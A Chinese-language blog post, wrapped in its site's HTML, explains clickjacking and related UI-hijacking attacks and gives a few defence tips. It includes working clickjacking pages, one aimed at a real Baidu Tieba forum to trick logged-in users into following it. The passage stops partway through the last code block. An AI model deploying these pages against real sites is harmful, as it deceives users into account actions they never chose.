@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="web前端,界面劫持,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demos's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="界面劫持界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。 界面劫持分类 点击劫持：劫持用户的鼠标点击操作 拖放劫持：劫持用户的鼠标拖放行为(鼠标拖放行为不受跨域的限制) 触屏">
+<meta name="keywords" content="web前端,界面劫持">
+<meta property="og:type" content="article">
+<meta property="og:title" content="界面劫持">
+<meta property="og:url" content="https://www.lsowl.top/2018/10/27/界面劫持/index.html">
+<meta property="og:site_name" content="Demos&#39;s Blog">
+<meta property="og:description" content="界面劫持界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。 界面劫持分类 点击劫持：劫持用户的鼠标点击操作 拖放劫持：劫持用户的鼠标拖放行为(鼠标拖放行为不受跨域的限制) 触屏">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572083527.72.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146338.05.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146436.41.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146499.35.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146911.11.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182354.51.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182435.88.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182583.03.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182595.7.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572182966.45.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183292.84.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183394.57.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183600.0.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183636.5.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183712.82.png">
+<meta property="og:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572183798.76.png">
+<meta property="og:updated_time" content="2019-10-27T14:00:35.522Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="界面劫持">
+<meta name="twitter:description" content="界面劫持界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。 界面劫持分类 点击劫持：劫持用户的鼠标点击操作 拖放劫持：劫持用户的鼠标拖放行为(鼠标拖放行为不受跨域的限制) 触屏">
+<meta name="twitter:image" content="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572083527.72.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.lsowl.top/2018/10/27/界面劫持/">
+
+
+
+
+
+  <title>界面劫持 | Demos's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Demos's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">It's A Long Road</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.lsowl.top/2018/10/27/界面劫持/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Demos">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Demos's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">界面劫持</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-27T21:53:52+08:00">
+                2018-10-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web前端相关/" itemprop="url" rel="index">
+                    <span itemprop="name">web前端相关</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3,407
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  15
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="界面劫持"><a href="#界面劫持" class="headerlink" title="界面劫持"></a>界面劫持</h3><p>界面劫持攻击时一种基于视觉欺骗的web会话劫持攻击，它通过在网页的可见控件上覆盖一个不可见的框(iframe)，使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。</p>
+<h3 id="界面劫持分类"><a href="#界面劫持分类" class="headerlink" title="界面劫持分类"></a>界面劫持分类</h3><ul>
+<li>点击劫持：劫持用户的鼠标点击操作</li>
+<li>拖放劫持：劫持用户的鼠标拖放行为(鼠标拖放行为不受跨域的限制)</li>
+<li>触屏劫持：劫持用户触摸屏幕的行为</li>
+</ul>
+<h3 id="劫持原理"><a href="#劫持原理" class="headerlink" title="劫持原理"></a>劫持原理</h3><p>劫持是通过覆盖一个不可见的框，从原理上来说是一个透明层+iframe，透明层是指页面的透明度为零</p>
+<h4 id="透明层使用CSS样式实现"><a href="#透明层使用CSS样式实现" class="headerlink" title="透明层使用CSS样式实现"></a>透明层使用CSS样式实现</h4><p>IE浏览器使用私有的CSS透明属性</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter:alpha(opacity=<span class="number">50</span>) <span class="comment">//数值从0-100，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure>
+<p>chrome、Firefox等使用的CSS透明属性如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opacity:<span class="number">0.5</span> <span class="comment">//数值从0-1，数值越小，透明度越高</span></span><br></pre></td></tr></table></figure>
+<p>控件位置之间的层次关系使用z-index，任何浏览器都支持</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z-index:<span class="number">1</span>   <span class="comment">//数值可以是负数，高数值的控件会低于低数值控件的前面，数值越高，控件越靠近用户</span></span><br></pre></td></tr></table></figure>
+<h4 id="使用iframe嵌入被劫持的页面"><a href="#使用iframe嵌入被劫持的页面" class="headerlink" title="使用iframe嵌入被劫持的页面"></a>使用iframe嵌入被劫持的页面</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe id=<span class="string">"victim"</span> src=<span class="string">"http://www.victim.com"</span> scrolling=<span class="string">"no"</span>&gt;   <span class="comment">//通过页面透明层+iframe实现对用户的视觉欺骗，即用户看到的操作对象和实际的操作对象是不一致的</span></span><br></pre></td></tr></table></figure>
+<h3 id="拖放劫持相关"><a href="#拖放劫持相关" class="headerlink" title="拖放劫持相关"></a>拖放劫持相关</h3><blockquote>
+<p>由于拖放劫持和触屏劫持实现较负载，这里只了解相关知识</p>
+</blockquote>
+<h4 id="拖放劫持的思路"><a href="#拖放劫持的思路" class="headerlink" title="拖放劫持的思路"></a>拖放劫持的思路</h4><p>“拖放劫持”的思路是诱使用户从隐藏的不可见iframe中”拖拽”出攻击者希望得到的数据，然后放到攻击者能控制的另外一个页面中，从而窃取数据。（突破同源限制）</p>
+<h4 id="拖放劫持技术原理"><a href="#拖放劫持技术原理" class="headerlink" title="拖放劫持技术原理"></a>拖放劫持技术原理</h4><p>支持Drag&amp;Drop API</p>
+<blockquote>
+<p>主流的浏览器都有drag-and-drop API 接口，供网站开发人员创建交互式网页。但是，这些 API 接口在设计时没有考虑很多的安全性问题，导致通过拖拽就可以实现跨域操作。利用拖拽技术，攻击者可以突破很多已有的安全防御措施。</p>
+<p>利用拖拽技术，攻击者可以轻易将文本注入到目标网页。在实际实施过程中，攻击者欺骗用户选择输入框的内容，完成拖拽操作。另外一种方式是，通过浏览器的 API 接口将 iframe 中的内容拖拽到目标网页的 text area 中，攻击者就可以获得用户网页中存在的敏感信息。</p>
+</blockquote>
+<p>dataTransfer对象</p>
+<blockquote>
+<p>为了能够协助通过拖放操作传递数据，在IE5.0以后引入了dataTransfer对象，他作为event对象的一个属性出现，用于从被拖动的对象传递字符串到放置对象。</p>
+<p>dataTransfer对象定义了两个主要方法：getData()和setData().getData操作完成获取由setData所存储的数据。setData操作完成向系统剪贴板中存储需要传递的数据，传递数据分为两种类型：文本数据和URL数据。在HTML5的扩展中，其允许指定任意的MIME类型。有了dataTransfer对象和操作方法后，就为跨域传递数据提供了有效的技术手段</p>
+</blockquote>
+<h4 id="拖放劫持防御方法"><a href="#拖放劫持防御方法" class="headerlink" title="拖放劫持防御方法"></a>拖放劫持防御方法</h4><p>目前只有FireFox和IE浏览器支持拖放功能，Chrome并不支持拖放功能，所以使用Chrome浏览器可在一定程度上防御拖放攻击；对于IE浏览器来说，不使用ActiveX这类危险组件也可以有效防御拖放攻击。</p>
+<h3 id="触屏劫持相关"><a href="#触屏劫持相关" class="headerlink" title="触屏劫持相关"></a>触屏劫持相关</h3><blockquote>
+<p>较为复杂，了解相关知识</p>
+</blockquote>
+<h4 id="触屏劫持防御"><a href="#触屏劫持防御" class="headerlink" title="触屏劫持防御"></a>触屏劫持防御</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、不点击任何不明网站、App上弹出的各种提示信息，例如：手机中病毒需升级杀毒软件等等。最好使用返回键，返回上一级页面，如若恶意跳转，大概率为恶意网站且包含触屏劫持。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">2、苹果手机在使用Safari浏览器的时候，遇到不明情况的提示框或页面，一定要确认地址栏的地址是否隐藏以及是否正确，若网站上含有触屏劫持，则大概率会添加假的地址栏做误导，需谨慎认清。</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">3、安卓手机要多加注意提示框弹出前后，手机系统给出的提示，由于不同安卓手机有很大差别触屏劫持在不同手机上会有不同的效果，但在获取权限时系统都会有好几步的确认工作，所以要多加注意之中细微的差别。</span><br></pre></td></tr></table></figure>
+<h3 id="点击劫持技术实现"><a href="#点击劫持技术实现" class="headerlink" title="点击劫持技术实现"></a>点击劫持技术实现</h3><p>构造一个点击页面，上面覆盖一个透明层的iframe，当诱导用户点击时触发iframe中的页面中的login按钮</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;style&gt;</span></span><br><span class="line"><span class="regexp">        #click&#123;</span></span><br><span class="line"><span class="regexp">            width: 100px;</span></span><br><span class="line"><span class="regexp">            top: 20px;</span></span><br><span class="line"><span class="regexp">            left: 20px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">        z-index: 1</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">        #hidden&#123;</span></span><br><span class="line"><span class="regexp">            height: 50px;</span></span><br><span class="line"><span class="regexp">            width: 120px;</span></span><br><span class="line"><span class="regexp">            position: absolute;</span></span><br><span class="line"><span class="regexp">            filter: alpha(opacity=50);</span></span><br><span class="line"><span class="regexp">        opacity: 0;</span></span><br><span class="line"><span class="regexp">        z-index: 2</span></span><br><span class="line"><span class="regexp">        &#125;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>style&gt;</span><br><span class="line">    &lt;input id=<span class="string">"click"</span> value=<span class="string">"Click me"</span> type=<span class="string">"button"</span>/&gt;</span><br><span class="line">    &lt;iframe id=<span class="string">"hidden"</span> src=<span class="string">"inner.html"</span> scrolling=<span class="string">"no"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<p>inner.html</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;<span class="xml"><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;input style="width: 100px;" value="Login" type="button" onclick="alert('clickjacking_test')"/</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<p>效果如下</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572083527.72.png" alt></p>
+<p>说明：</p>
+<p>clickjacking.html是一个用户可见的伪装页面，在其页面中设置iframe所在层为透明层，并在iframe中嵌套了inner.html页面。在clickjacking.html页面中设计了Click me,inner.html中的”login”按钮与其重合，所以在用户点击Click me时实际上点击的是login按钮。</p>
+<h3 id="点击劫持实战"><a href="#点击劫持实战" class="headerlink" title="点击劫持实战"></a>点击劫持实战</h3><p>利用点击劫持诱导用户关注贴吧(在百度账户登录的情况下；目标<code>http://tieba.baidu.com/f?kw=%C3%C0%C5%AE</code></p>
+<p>抓包测试HTTP响应头是否有 X-Frame-Options字段</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146338.05.png" alt></p>
+<p>构造透明层iframe</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line">     &lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146436.41.png" alt></p>
+<p>修改opacity值为0.3查看覆盖效果</p>
+<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572146499.35.png" alt></p>
+<p>可以看到刚好覆盖在关注按钮上，只有用户登录了百度账户，诱导用户点击即可劫持鼠标点击关注</p>
+<p>一般这种界面不容易诱导用户，所以要构造好诱导页面；在iframe中加载目标站点时，除了点击劫持还可以进行图片覆盖，有些图片的本来就可以诱导用户，当然也可以点击劫持加图片覆盖结合使用</p>
+<p><strong>示例</strong>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;</span><br><span class="line">&lt;img src=<span class="string">"sonarqube-black-256px.png"</span> style=<span class="string">"position:absolute;top:90px;left:320px;"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
+<p>结合刚才的实例一起加载</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;点击劫持&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;style&gt;</span></span><br><span class="line"><span class="regexp">     html,body,iframe&#123;</span></span><br><span class="line"><span class="regexp">         display: block;</span></span><br><span class="line"><span class="regexp">          height: 100%;</span></span><br><span class="line"><span class="regexp">          width: 100%;</span></span><br><span class="line"><span class="regexp">          margin: 0;</span></span><br><span class="line"><span class="regexp">          padding: 0;</span></span><br><span class="line"><span class="regexp">          border:none;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     iframe&#123;</span></span><br><span class="line"><span class="regexp">          opacity:0.3;</span></span><br><span class="line"><span class="regexp">          filter:alpha(opacity=0);</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          z-index:2;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">     button&#123;</span></span><br><span class="line"><span class="regexp">          position:absolute;</span></span><br><span class="line"><span class="regexp">          top: 355px;</span></span><br><span class="line"><span class="regexp">          left: 547px;</span></span><br><span class="line"><span class="regexp">          z-index: 1;</span></span><br><span class="line"><span class="regexp">          width: 72px;</span></span><br><span class="line"><span class="regexp">          height: 26px;</span></span><br><span class="line"><span class="regexp">     &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>style&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">     &lt;body&gt;</span></span><br><span class="line"><span class="regexp">          那些不能说的秘密</span></span><br><span class="line"><span class="regexp">          &lt;button&gt;查看详情&lt;/</span>button&gt;</span><br><span class="line">          &lt;iframe src=<span class="string">"http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"</span>&gt;<span 